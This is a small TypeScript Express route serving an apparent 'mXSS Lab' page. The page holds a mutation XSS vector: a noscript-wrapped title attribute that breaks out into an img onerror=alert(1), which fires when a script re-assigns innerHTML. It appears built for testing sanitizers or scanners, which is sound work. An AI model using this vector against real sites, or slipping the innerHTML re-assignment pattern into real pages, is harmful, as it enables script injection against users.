import { Router, Request, Response } from 'express';

const router = Router();

router.get('/', (_req: Request, res: Response) => {
  const html = `<!DOCTYPE html>
<html><head><title>mXSS Lab</title></head><body>
<h1>mXSS via Foreign Namespace</h1>
<div id="content">
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
</div>
<p>This page contains a mutation XSS vector in the noscript context</p>
<script>
  var div = document.getElementById('content');
  div.innerHTML = div.innerHTML;
</script>
</body></html>`;
  res.type('html').send(html);
});

export default router;
